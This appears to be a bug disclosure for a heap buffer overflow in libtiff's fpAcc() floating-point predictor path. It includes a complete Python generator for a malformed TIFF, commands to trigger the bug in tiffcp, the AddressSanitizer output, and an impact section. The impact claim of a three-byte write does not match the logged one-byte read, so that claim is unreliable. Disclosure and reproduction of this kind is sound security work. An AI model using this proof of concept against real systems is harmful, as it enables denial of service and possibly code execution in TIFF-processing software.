## Bug0: Heap Buffer Overflow in fpAcc via Non-Multiple-of-8 BitsPerSample with Floating-Point Predictor

In `fpAcc()` in `libtiff/tif_predict.c` (lines 352–383), the accumulation loop executes `REPEAT4(stride, cp[stride] += cp[0]; cp++)` without verifying that the strip row size is a multiple of `stride`, so when `BitsPerSample` is not a multiple of 8 the final loop iteration writes past the end of the heap-allocated strip buffer causing a heap buffer overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import zlib

OUTPUT_PATH = 'poc_input.tif'

TYPE_SHORT = 3
TYPE_LONG  = 4

TAG_IMAGEWIDTH        = 0x0100
TAG_IMAGELENGTH       = 0x0101
TAG_BITSPERSAMPLE     = 0x0102
TAG_COMPRESSION       = 0x0103
TAG_PHOTOMETRIC       = 0x0106
TAG_STRIPOFFSETS      = 0x0111
TAG_SAMPLESPERPIXEL   = 0x0115
TAG_ROWSPERSTRIP      = 0x0116
TAG_STRIPBYTECOUNTS   = 0x0117
TAG_PLANARCONFIG      = 0x011C
TAG_PREDICTOR         = 0x013D
TAG_SAMPLEFORMAT      = 0x0153

WIDTH               = 3
HEIGHT              = 1
BITS_PER_SAMPLE     = 9   # non-multiple-of-8 triggers the overflow
COMPRESSION_DEFLATE = 8
PHOTOMETRIC         = 1
SAMPLES_PER_PIXEL   = 5   # stride=5; rowsize=17, 17%5=2 causes misalignment
ROWS_PER_STRIP      = 1
PLANARCONFIG_CONTIG = 1
PREDICTOR_FP        = 3   # PREDICTOR_FLOATINGPOINT -> routes to fpAcc()
SAMPLEFORMAT_IEEEFP = 3   # required for floating-point predictor path


def make_tag(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)


RAW_SIZE = (BITS_PER_SAMPLE * WIDTH * SAMPLES_PER_PIXEL + 7) // 8  # = 17
raw_strip = bytes(RAW_SIZE)
compressed_strip = zlib.compress(raw_strip, level=1)
compressed_size  = len(compressed_strip)

NUM_TAGS    = 12
IFD_OFFSET  = 8
IFD_SIZE    = 2 + NUM_TAGS * 12 + 4
STRIP_OFFSET = IFD_OFFSET + IFD_SIZE

header = struct.pack('<2sHI', b'II', 42, IFD_OFFSET)

entries = [
    make_tag(TAG_IMAGEWIDTH,      TYPE_SHORT, 1, WIDTH),
    make_tag(TAG_IMAGELENGTH,     TYPE_SHORT, 1, HEIGHT),
    make_tag(TAG_BITSPERSAMPLE,   TYPE_SHORT, 1, BITS_PER_SAMPLE),
    make_tag(TAG_COMPRESSION,     TYPE_SHORT, 1, COMPRESSION_DEFLATE),
    make_tag(TAG_PHOTOMETRIC,     TYPE_SHORT, 1, PHOTOMETRIC),
    make_tag(TAG_STRIPOFFSETS,    TYPE_LONG,  1, STRIP_OFFSET),
    make_tag(TAG_SAMPLESPERPIXEL, TYPE_SHORT, 1, SAMPLES_PER_PIXEL),
    make_tag(TAG_ROWSPERSTRIP,    TYPE_SHORT, 1, ROWS_PER_STRIP),
    make_tag(TAG_STRIPBYTECOUNTS, TYPE_LONG,  1, compressed_size),
    make_tag(TAG_PLANARCONFIG,    TYPE_SHORT, 1, PLANARCONFIG_CONTIG),
    make_tag(TAG_PREDICTOR,       TYPE_SHORT, 1, PREDICTOR_FP),
    make_tag(TAG_SAMPLEFORMAT,    TYPE_SHORT, 1, SAMPLEFORMAT_IEEEFP),
]

ifd = struct.pack('<H', NUM_TAGS) + b''.join(entries) + struct.pack('<I', 0)
tiff_bytes = header + ifd + compressed_strip

with open(OUTPUT_PATH, 'wb') as f:
    f.write(tiff_bytes)

print(f"[+] Wrote {len(tiff_bytes)} bytes to {OUTPUT_PATH}")
print(f"    RAW_SIZE={RAW_SIZE}  stride={SAMPLES_PER_PIXEL}  "
      f"remainder={RAW_SIZE % SAMPLES_PER_PIXEL}  "
      f"overflow_bytes={SAMPLES_PER_PIXEL - RAW_SIZE % SAMPLES_PER_PIXEL}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffcp poc_input.tif /tmp/out_.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000051 at pc 0x7f893677466c bp 0x7ffe77b110e0 sp 0x7ffe77b110d0
READ of size 1 at 0x503000000051 thread T0
    #0 0x7f893677466b in fpAcc (libtiff.so.3+0x3d566b)
    #1 0x7f893677544a in PredictorDecodeTile (libtiff.so.3+0x3d644a)
0x503000000051 is located 0 bytes to the right of 17-byte region [0x503000000040,0x503000000051)

### Impact

A remote attacker can supply a crafted TIFF file with `BitsPerSample=9`, `SamplesPerPixel=5`, `Predictor=3`, and `SampleFormat=SAMPLEFORMAT_IEEEFP` to cause `fpAcc()` to write three bytes past the end of a heap-allocated strip buffer, corrupting adjacent heap metadata or objects with attacker-influenced accumulated delta values. Any application or tool that decodes TIFF strips through `TIFFReadEncodedStrip()` or `TIFFReadScanline()` is exposed to this attack surface, including `tiffcp`, `tiff2pdf`, and image-loading libraries that wrap libtiff. In the worst case the heap corruption enables arbitrary code execution, and in the minimum case it causes a reliable process crash constituting denial of service.
